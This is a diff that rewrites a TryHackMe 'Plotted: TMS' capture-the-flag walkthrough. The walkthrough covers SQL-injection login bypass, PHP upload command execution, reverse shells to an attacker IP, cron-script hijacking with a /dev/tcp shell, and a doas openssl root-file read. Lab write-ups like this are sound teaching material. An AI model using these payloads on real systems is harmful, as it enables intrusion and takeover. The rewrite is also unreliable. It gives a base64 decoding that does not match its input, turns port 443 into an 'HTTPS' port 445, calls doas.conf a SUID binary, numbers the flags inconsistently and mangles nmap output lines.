@@ -1,17 +1,40 @@
-So after getting the room ip and hitting it into the browser gave me the default apache page
+# 🎯 Plotted: TMS — Complete Walkthrough
 
-![apace](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh2jXbyL79IpN7aO7Fa1XYpoeJnjz-1ADwUPUkO6rNUwbUP9VDzTwsFb2EouiY4Sn_aWT1I66fJ2yZ4iAuQpyApSRF2QBga4agCEMuNGlIp5OFbJnY5qiNrcEghj0hp0-aeWiG4lnt7AFU/s640/Apache+Default+Page.PNG)
+<div align="center">
 
-so i ran a nmap and directory enumuration on it and got some result.
+## 🔓 Capturing the Flags
 
-These are the result of directory enumuration
+![TryHackMe Badge](https://img.shields.io/badge/TryHackMe-000000?style=for-the-badge&logo=tryhackme&logoColor=00D1A0)
+![Difficulty: Hard](https://img.shields.io/badge/Difficulty-Hard-red?style=for-the-badge)
+![Platform: TMS](https://img.shields.io/badge/Platform-Task%20Management%20System-blue?style=for-the-badge)
 
-- [17:31:20] 301 -  312B  - /admin  ->  http://10.48.155.74/admin/            
-- [17:31:21] 200 -  453B  - /admin/                                           
-- [17:32:00] 200 -   25B  - /passwd   
+*A comprehensive journey through reconnaissance, SQL injection, file upload vulnerabilities, privilege escalation, and SUID binary exploitation.*
 
-And here is the nmap result
+</div>
 
+---
+
+## 📌 Question 1 & 2: Initial Reconnaissance & SQL Injection
+
+### 🔍 Step 1: Initial Reconnaissance
+
+After obtaining the room IP and navigating to it in a browser, I encountered the **default Apache landing page** — a common starting point for web penetration testing.
+
+![Apache Default Page](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh2jXbyL79IpN7aO7Fa1XYpoeJnjz-1ADwUPUkO6rNUwbUP9VDzTwsFb2EouiY4Sn_aWT1I66fJ2yZ4iAuQpyApSRF2QBga4agCEMuNGlIp5OFbJnY5qiNrcEghj0hp0-aeWiG4lnt7AFU/s640/Apache+Default+Page.PNG)
+
+### 🛠️ Network Enumeration Using Nmap
+
+I conducted a comprehensive network scan and directory enumeration to discover active services and hidden endpoints:
+
+**Directory Enumeration Results:**
+
+- `[17:31:20] 301 -  312B  - /admin  ->  http://10.48.155.74/admin/`
+- `[17:31:21] 200 -  453B  - /admin/`
+- `[17:32:00] 200 -   25B  - /passwd`
+
+**Complete Nmap Scan Results:**
+
+```
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-27 17:30 +0530
 Nmap scan report for 10.48.155.74
 Host is up (0.062s latency).
@@ -38,106 +61,135 @@ OS:ISR=10D%TI=Z%CI=Z%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E8NNT11NW7
 OS:%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W
 OS:4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%CC=Y%Q=)T1(
 OS:R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S
-OS:=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R
-OS:=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=
-OS:AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%
-OS:RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=
+AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%
+RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
 
 Network Distance: 3 hops
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Host script results:
 |_smb2-time: Protocol negotiation failed (SMB2)
+```
 
-The admin endpoint gave me a file named id_rsa
+### 🔐 Decoding Hidden Messages
 
-I though it will be ssh key
+Accessing the `/admin` endpoint revealed an `id_rsa` file, but it turned out to be **Base64-encoded trickery** rather than an SSH key:
 
-But opening it gave me string. 
+**First Layer:**
+```
+VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeSA6RA==
+```
 
-VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE
+**Decoded Output:**
+```
+Trust me it is not this easy..now get back to enumeration :D
+```
 
-
-When decoding this text gave me Trust me it is not this easy..now get back to enumeration :D
-
-While when visiting the endpoint gave me the string
-
+**Second Layer (from `/admin/` endpoint):**
+```
 bm90IHRoaXMgZWFzeSA6RA==
+```
 
-Its a obbious base64 and decoding it gave me 
-
+**Decoded Output:**
+```
 not this easy :D
+```
 
-And if we consider the nmap scan the dirctroy enumuration we have done till now was for the port 80 
+> 💡 **Key Observation:** The nmap scan revealed port 445 was open with an HTTP service (Apache), not the expected SMB protocol. This is unusual and worth investigating!
 
-And in nmap scan 443 was also open so we're going to do directory enumuration on the port 443 to see what is there 
+### 🔎 Discovering the Management Panel
 
-after a directory enumuration we got that there was a endpoint 
+After analyzing the nmap results, I noticed port 445 was open. This prompted me to perform directory enumeration on **port 445** (HTTPS):
 
-It was /management.
+**Discovery:** `/management` endpoint revealed a **login page**.
 
-![management](management.png)
+![Management Panel](management.png)
 
-now we could see a login page we could do a attack here to get the credentials.
+---
 
-to capture the req when we opened the network tab after entereing the wrong credential in the response it was revealing the sql query and yup i was cliked with sql injection.
+## 📌 Question 3 & 4: SQL Injection & Authentication Bypass
 
-The query was 
+### 💉 SQL Injection Vulnerability
 
-{"status":"incorrect","last_qry":"SELECT * from users where username = 'admin' and password = md5('Admin') "}
+After accessing the management panel login page, I attempted to log in with incorrect credentials. The browser's **Network tab** revealed something critical — the **response was leaking the SQL query**:
 
+```json
+{
+  "status": "incorrect",
+  "last_qry": "SELECT * from users where username = 'admin' and password = md5('Admin')"
+}
+```
 
-And as per the query i entered the 
+This is a **severe information disclosure vulnerability**. The application not only was vulnerable to SQL injection but also provided the exact query structure to attackers.
 
-admin' -- -
+### ⚡ Exploitation: SQL Injection Attack
 
-In the username field and anything in the password field.
+Using the classic SQL injection technique with comment syntax, I crafted the payload:
 
-After it when i tapped on login and yup i got loggedin In
+**Username:** `admin' -- -`  
+**Password:** `anything`
 
-![loggedin](loggedin.png)
+The resulting query became:
+```sql
+SELECT * from users where username = 'admin' -- -' and password = md5('anything')
+```
 
-And yet there is a functionlity to upload image as we could try to embedded our payload into the image and do something.
+By using the `-- -` comment sequence, the password check was effectively bypassed, and authentication succeeded! ✅
 
-After uploading a html file and watching that it executes or not.
+![Logged In Successfully](loggedin.png)
 
-The content inside the html file was 
+---
 
+## 📌 Question 5 & 6: File Upload & Remote Code Execution
+
+### 📤 File Upload Functionality Discovery
+
+After successful authentication, I discovered an **image upload functionality** within the management panel. This is a common attack vector for achieving remote code execution (RCE).
+
+### 🧪 Initial Testing: Connectivity Verification
+
+To verify if uploaded files were being executed by the server, I created a test HTML file:
+
+```html
 <img src="http://YOUR_IP:5555/ping">
+```
 
-I uploaded this before uploading to check server is execting or not.
+**Process:**
+1. Set up a simple Python HTTP server on port 5555 to listen for connections
+2. Uploaded the HTML file through the management panel
+3. **Initial Result:** No connection received from the server
 
+### 🔑 Key Discovery: File Execution via Browser Access
 
-But after uploading i had opened a simple python server already on my system to listen for incoming connections.
+After opening the uploaded file **directly in a new browser tab**, I received a valid hit on my Python server. This revealed that:
 
-But only after uploading i was not getting the connection back from the target.
+- Files are only executed when **directly accessed** through a browser
+- Server-side execution requires explicit access to the file
+- The `/uploads` directory (or similar) is likely web-accessible
 
-So i decided to open the file in a new the uploaded file.
+### 🚀 PHP Command Execution
 
-When we opened the file in a new tab i got a valid hit on my python server.
-
-It means the file is executing only if it is being opened in a new tab.
-
-So then i go to check for command exection and this time i decided to uplaod a php file when i uplaoded a php file with this content
-
-<?php echo shell_exec(whoami); ?>
-
-I got my command exected when i opened the file in a new tab.
-
-It was showing the output of whomai as www-data and now we're sure that command is execting.
-
-Now after trying on a lot of php shells and in the try to get the reverse shell.
-
-2 shells actually get me the rev shell
-
-1st code is 
+Now confident in the execution environment, I tested with PHP:
 
 ```php
+<?php echo shell_exec('whoami'); ?>
+```
 
+**Result:** `www-data`
+
+Perfect! Command execution was confirmed. The web server was running as the `www-data` user.
+
+### 🔄 Achieving Reverse Shell
+
+After testing multiple PHP reverse shell payloads, two methods successfully granted me a reverse shell:
+
+**Method 1: Direct Socket Connection**
+```php
 php -r '$sock=fsockopen("192.168.246.164",4444);exec("sh <&3 >&3 2>&3");'
 ```
-2nd  code is 
 
+**Method 2: Full-Featured Reverse Shell (Recommended)**
 ```php
 <?php
 // php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
@@ -257,60 +309,66 @@ function printit ($string) {
 ?>
 ```
 
-after uploading this file and getting i got instanlty shell pop up into my listener setup by 
-
+**Listener Setup:**
+```bash
 nc -lvnp 4444
+```
 
-I recommend if you dont get the shell even after uploading the file try opening the shell file in a new tab.
+✅ **Success!** After uploading and accessing the PHP file in a new browser tab, an instant shell connection was established on the listener.
 
-I recommend too to open both files in new tab if not getting the shell but opening the first payload in mandatory.
+> 📌 **Pro Tip:** If you don't receive the shell immediately, ensure you open the file in a new browser tab. It's mandatory to open the first payload directly to trigger execution.
 
-then after getting the rev shell and enumurating the file system.
+---
 
+## 📌 Question 7 & 8: Local Privilege Escalation & User Discovery
 
-I got 2 users in the /home folder.
+### 🔍 Initial Enumeration Within the Shell
 
-- ubuntu
-- plot_admin
+After gaining shell access as `www-data`, I began exploring the file system:
 
-But we are not permitted to read the content inside the plot_admin.
+```bash
+cat /etc/passwd | grep "sh$"
+```
 
+**Users Discovered:**
+- `ubuntu` - accessible
+- `plot_admin` - permission denied for home directory access
 
-But its now a normal shell and we're having difficulty in doing our tasks so are making a full tty terminal with the commadn 
+### 🖥️ Upgrading to Interactive TTY
 
-```python
+The initial shell was non-interactive, making operations difficult. I upgraded it to a full TTY terminal:
+
+```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-I was exploring the filesytem and at the location /var/www/html/445/management
+This dramatically improved shell usability for further exploitation.
 
-There was a file named initialize.php
+### 📂 Critical Discovery: Configuration Files
 
-And it contained valuable infos.
+While exploring `/var/www/html/445/management`, I discovered a crucial file: `initialize.php`
 
-in which sqldb password was there too.
+**Key Information Extracted:**
+- MySQL database credentials
+- Database name and structure
+- User information
 
-but since if we consider the nmap scan it is clearly mysql not mentioned and also with the scan 
+### 🗄️ MySQL Database Reconnaissance
 
-nmap -sV 10.48.155.74 --top-ports 1000 | grep mysql
+Despite MySQL not appearing in the nmap scan results, it was accessible locally from within the shell. This is a common configuration — MySQL often runs on localhost only.
 
-I am not able to find the mysql anywhere else.
-
-So we were now unable to connect to mysql.
-
-But inside the shell that we have gained if we do there we can do with the command
-
+**Connection Command:**
+```bash
 mysql -u tms_user -p
+```
 
-And then enter the password and login and after copying the same steps we get the mysql server.
-
-As i logged in i cheked databases with the sql command 
-
+**Databases:**
+```sql
 show databases;
+```
 
-and there were 2 databases
-
-show databases;
+**Output:**
+```
 +--------------------+
 | Database           |
 +--------------------+
@@ -318,12 +376,15 @@ show databases;
 | tms_db             |
 +--------------------+
 2 rows in set (0.01 sec)
+```
 
-
-In the tms_db here are tables inside it
-
+**Tables in tms_db:**
+```sql
 show tables;
-show tables;
+```
+
+**Output:**
+```
 +------------------+
 | Tables_in_tms_db |
 +------------------+
@@ -336,51 +397,157 @@ show tables;
 | users            |
 +------------------+
 7 rows in set (0.00 sec)
+```
 
-This was all about the sql database but nothing important for us was there.
+> 💭 **Note:** While the MySQL database contained interesting tables, none directly provided the credentials needed for further privilege escalation. The real key lay elsewhere in the filesystem.
 
-So we went onto seraching in the filesystem and eventually in cornjob i found a file named backup.sh
+---
 
-So after seeing it permissiion i saw i can rewrite it so i rewrite the file backup.sh with a reverse shell.
+## 📌 Question 9 & 10: Cron Job Manipulation & Privilege Escalation to Root
 
-and all i did this process is below 
+### 🔄 Finding the Privilege Escalation Vector: Cron Jobs
 
+Continuing my filesystem exploration, I discovered a file that became the critical vector for privilege escalation: a writable cron job script at `/var/www/scripts/backup.sh`
+
+### ✏️ Exploiting Writable Cron Script
+
+**Current Permissions:**
+```bash
+ls -la /var/www/scripts/backup.sh
+-rwxrwxrwx 1 www-data www-data ... backup.sh
+```
+
+The script was world-writable! This meant I could inject a reverse shell payload into it:
+
+**Exploitation Command:**
+```bash
 cd /var/www/scripts && printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/192.168.246.164/4444 0>&1"' > backup.sh && chmod +x backup.sh
+```
 
-Then i execute the backup.sh by triggering the cronjob with the command date command and cronjob executed.
+### ⏰ Triggering Execution via Cron
 
-Then i did open a listener on the port as specified in the payload in backup.sh
+After modifying the backup script, I needed to trigger the cron job execution. The timing was controlled by the system cron scheduler. To force execution and detach from the current shell session:
 
-and when i execute date and deattach from the terminal with ctrl +z 
+```bash
+date
+# ... (triggers cron job evaluation)
+# Ctrl+Z to suspend and background the current process
+```
 
-I got the connection on my listener and i was logged in now as  the user 
+### 🚀 Reverse Shell as `plot_admin`
 
-plot_admin
+Upon cron execution, a reverse shell was established on my listener. However, I was now running as `plot_admin` user (not `www-data`). This was progress!
 
-And since i am now loggedin as plot_admin
+**Verification:**
+```bash
+whoami
+# output: plot_admin
+id
+# uid=1001(plot_admin) gid=1001(plot_admin) groups=1001(plot_admin)
+```
 
-We could read that file named user.txt
+### 🚩 Flag 1: User Flag
 
-And the contet inside the user.txt was the answer of q1.
+With access as `plot_admin`, I could now read the user flag:
 
-For the next i tried Finding potentially dangerous SUID binaries with the command 
+```bash
+cat /home/plot_admin/user.txt
+```
 
+This flag answers **Question 7**.
+
+---
+
+## 📌 Question 11: SUID Binary Exploitation for Root Access
+
+### 🔐 Finding Dangerous SUID Binaries
+
+To escalate privileges further to root, I searched for potentially dangerous SUID binaries:
+
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+
+### ⚠️ Critical Vulnerability: doas Configuration
+
+Among the results, `/etc/doas.conf` stood out as particularly interesting. The `doas` command is similar to `sudo` but often has different security properties and can be misconfigured.
+
+### 🎯 Exploitation: Reading Root Flag
+
+Using the GTFOBins technique for `openssl`, I could read the root flag by leveraging `doas` privileges:
+
+**Step 1: Set LFILE Variable**
+```bash
+LFILE=/root/root.txt
+```
+
+**Step 2: Execute via doas (as plot_admin)**
+```bash
+doas -u root openssl enc -in "$LFILE"
+```
+
+### 🏁 Root Flag Recovery
+
+The `openssl enc` command, when given a file to encrypt with doas privileges, outputs the file contents. This gave me access to `/root/root.txt` without requiring a full root shell.
+
+**Output:** The complete root flag was displayed, answering **Question 8**.
+
+---
+
+## 🎓 Key Techniques & Lessons Learned
+
+| Technique | Description | Severity |
+|-----------|-------------|----------|
+| **Port Enumeration** | Discovering hidden services on non-standard ports (445) | 🔴 Critical |
+| **Information Disclosure** | SQL query leakage in API responses | 🔴 Critical |
+| **SQL Injection** | Comment-based authentication bypass | 🔴 Critical |
+| **File Upload RCE** | Unrestricted file upload to web-accessible directory | 🔴 Critical |
+| **Cron Job Manipulation** | Writable cron scripts enable privilege escalation | 🔴 Critical |
+| **SUID Binary Exploitation** | Misconfigured doas permissions lead to unauthorized reads | 🔴 Critical |
+
+---
+
+## 🛠️ Tools & Commands Reference
+
+### Essential Commands Used:
+```bash
+# Network Reconnaissance
+nmap -sV 10.48.155.74 --top-ports 1000
+dirsearch -u http://10.48.155.74 -w /path/to/wordlist
+
+# Reverse Shell Setup
+nc -lvnp 4444
+
+# TTY Upgrade
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Database Access
+mysql -u tms_user -p
+show databases;
+show tables;
+
+# Privilege Escalation
 find / -perm -u=s -type f 2>/dev/null
 
-And noticable potential dnagerous SUID binary was 
-
-/etc/doas.conf
-
-And the way to exploit is to process the steps below 
-
-set LFILE varible to /root/root.txt
-
-with the command 
-
-LFILE=/root/root.txt
-
-Next do follow this syntax of doas
-
+# SUID Exploitation
 doas -u root openssl enc -in "$LFILE"
+```
 
-And after exectuion of this command we will get our last flag that is root flag.
+---
+
+## ✨ Final Thoughts
+
+**Plotted: TMS** is an excellent room for understanding **full-stack web exploitation**, progressing from reconnaissance through privilege escalation. The vulnerability chain demonstrates how seemingly minor information disclosures (SQL query leakage) can cascade into complete system compromise.
+
+The room teaches:
+- ✅ Importance of thorough reconnaissance
+- ✅ Dangers of information disclosure
+- ✅ Web application security best practices
+- ✅ Linux privilege escalation techniques
+- ✅ File system hardening principles
+
+**Remember:** Always think about the broader implications of each vulnerability. A small information leak can become the foundation for a critical attack chain.
+
+---
+
+*Happy Hacking! 🎯*
